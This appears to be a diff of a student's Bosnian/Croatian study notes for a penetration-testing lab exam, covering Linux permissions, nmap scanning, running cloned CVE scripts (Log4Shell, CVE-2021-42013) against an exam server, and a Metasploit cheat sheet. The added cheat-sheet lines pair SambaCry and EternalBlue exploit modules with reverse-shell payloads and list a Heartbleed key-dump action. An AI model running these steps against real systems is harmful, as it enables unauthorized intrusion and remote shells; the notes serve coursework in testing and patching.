@@ -11,13 +11,13 @@ https://chat.qwen.ai/
 _______________________________________________________________________________ZADATAK 2__________________________________________________________________________________________________________________________ 
 Linux privilegije se određuju za tri grupe korisnika: vlasnika, grupu i ostale korisnike. Svakoj od ovih grupa mogu se dodijeliti sljedeća prava:
 
-Naziv  	|Vrijednost|	Upotreba i skraćenica
-________|__________|__________________________________________________________________________________________________________________________________________________
-read	   |     4    | r može vidjeti sadržaj direktorija	
-________|__________|__________________________________________________________________________________________________________________________________________________
-write	  |     2    | w može kreirati/brisati fajlove unutr
-________|__________|__________________________________________________________________________________________________________________________________________________
-execute	|     1    | x može ući u direktorij
+Naziv  	| Vrijednost|	Upotreba i skraćenica
+________|__________ |__________________________________________________________________________________________________________________________________________________
+read	   |      4    | r može vidjeti sadržaj direktorija	
+________|___________|__________________________________________________________________________________________________________________________________________________
+write	  |      2    | w može kreirati/brisati fajlove unutr
+________|___________|__________________________________________________________________________________________________________________________________________________
+execute	|      1    | x može ući u direktorij
 
 Nakon što je direktorij kreiran naredbom mkdir NazivDirektorija, radi se izlistavanje svih direktorija na kaliju preko komande ls -al kako bi se vidjele privilegije svakog direktorija posebno: 
 Nakon što je otkriveno ko ima i kakve privilegije, potrebno je postaviti privilegije onako kako je trazeno u zadatku: za to koristimo naredbu chmod 700 NazivDirektorija (chmod u=rw,g=rw,o=r MojaDatoteka.txt neki primjer) dakle samo vlasnik direktorija ima sve privilegije, 
@@ -96,6 +96,17 @@ Nakon toga potrebno je komandom ping IPAdresaServerIspita provjeriti da li ove d
 Koristimo komandu: sudo nmap -sS -sV -O IPAdresaServerIspita nikad ne stavimo /subnet, jer tako skeniranje dugo traje, skenira cijeli subnet kojem pripada ip adresu. 
 
 
+git clone https://github.com/r00thunter/Log4Shell
+ip a
+sudo systemctl stop NetworkManager
+sudo systemctl status NetworkManager
+sudo ip addr flush dev eth0
+ip a
+sudo ip addr add 172.21.224.2/20 dev eth0
+ip a
+ping 172.21.224.3
+sudo nmap -sS -sV -O 172.21.224.3
+
 
 _______________________________________________________________________________ZADATAK 5__________________________________________________________________________________________________________________________
 Zadatak 5 testiranje ranjivosti servera
@@ -105,6 +116,13 @@ pa cemo vidjeti da li je ta verzija ranjivosti primjenjiva na nas system. Naravn
 U nasem slucaju, preuzeli smo sve git repo pa komandom cd NazivFajlaKojiSmoKlonirali ulazimo u fajl. Izlistavamo fajl komandom ls
 onda testiramo ranjivost sistema komandom python3 NazivSkripte.py  IPAdresaServerIspita.
 U slučaju izbaci error: unrecognized arguments: 192.168.10.5 to znaci da skripta ne prima samu ip adresu nego je treba poslati ovako python3 cve-2021-42013.py -u http://192.168.10.5
+
+
+nmap -sV -O <IP_ServerIspit>
+cd NazivFajlaKojiSmoKlonirali
+ls
+python3 NazivSkripte.py <IP_ServerIspit>
+python3 cve-2021-42013.py -u http://<IP_ServerIspit>
 _______________________________________________________________________________METASPLOIT__________________________________________________________________________________________________________________________
 Ovaj način provjere koristimo kad postoji gotov modul u Metasploitu. Kad koristiti Metasploit? Koristimo ga kada zadatak kaže nešto tipa: koristiti Metasploit Framework; koristiti exploit is_known_pipename;
 pronaći modul za CVE; koristiti show options. Git clone koristimo kad profesor/zadatak daje GitHub skriptu ili kad Metasploit nema odgovarajući modul. 
@@ -125,7 +143,7 @@ U slucaju da nije automatski postavljen taad je potrebno iskoristiti port servis
 pored kojih pise verzija sambe ( za slucaj CVE-2017-7494 gleda se samba, a to sam otkrila pretrazivajuci internet, za druge slucajeve mogu se gledati i apache verzije).
 Nakon toga ponovo koristimo komandu show options kako bismo vidjeli da li je sve uspješno postavljeno: Nakon što je sve ispravno popunjeno komandom check provjeravamo ranjivost sistema. 
 Nakon toga komandom set RPORT 139 testiramo ranjivost i za drugi port , nakon čega komandom exit izlazimo. BITNO ZA NAPOMENUTI: Neki Metasploit moduli koriste check za provjeru ranjivosti,
-dok se kod auxiliary/scanner modula provjera često pokreće komandom: run ili exploit za exploit 
+dok se kod auxiliary/scanner modula provjera često pokreće komandom: run ili exploit za exploit module
 _______________________________________________________________________________METASPLOIT KOMANDE__________________________________________________________________________________________________________________________
 msfconsole
 search <ključna riječ ili CVE broj>
@@ -136,8 +154,13 @@ set <ostali specifični parametri: RPORT, ACTION, payload, LHOST, LPORT...>
 check
 run  (ili "exploit" kod exploit modula)
 
-*auxiliary/scanner/ssl/openssl_heartbleed -> set ACTION KEYS (ili SCAN/DUMP) -> https 443
-*SambaCry -> 	exploit/linux/samba/is_known_pipename -> 
+*Heartbleed -> auxiliary/scanner/ssl/openssl_heartbleed -> set ACTION KEYS (ili SCAN/DUMP) -> https 443
+*SambaCry -> 	exploit/linux/samba/is_known_pipename -> set payload cmd/unix/reverse_netcat, set LHOST -> smb 445 
+*MS17-010 (EternalBlue) skener ->	auxiliary/scanner/smb/smb_ms17_010	-> samo RHOSTS (nema posebnu opciju) -> smb 445
+*MS17-010 exploit	-> exploit/windows/smb/ms17_010_eternalblue >	set payload windows/x64/meterpreter/reverse_tcp, set LHOST -> smb 445
+*FTP anonymous login	-> auxiliary/scanner/ftp/anonymous ->	samo RHOSTS -> ftp 21
+*SMB verzija/OS detekcija	-> auxiliary/scanner/smb/smb_version	-> samo RHOSTS -> smb 445 
+*Generički SSL/TLS scan	-> auxiliary/scanner/ssl/openssl_ccs_inject (CVE-2014-0224) -> 	samo RHOSTS -> https 443
 
 _______________________________________________________________________________ZADATAK 6__________________________________________________________________________________________________________________________
 Ranjivost je potrebno ukloniti instaliranjem odgovarajuće sigurnosne zakrpe i nadogradnjom ranjivog servisa/aplikacije na verziju koja više nije pogođena ranjivošću. 
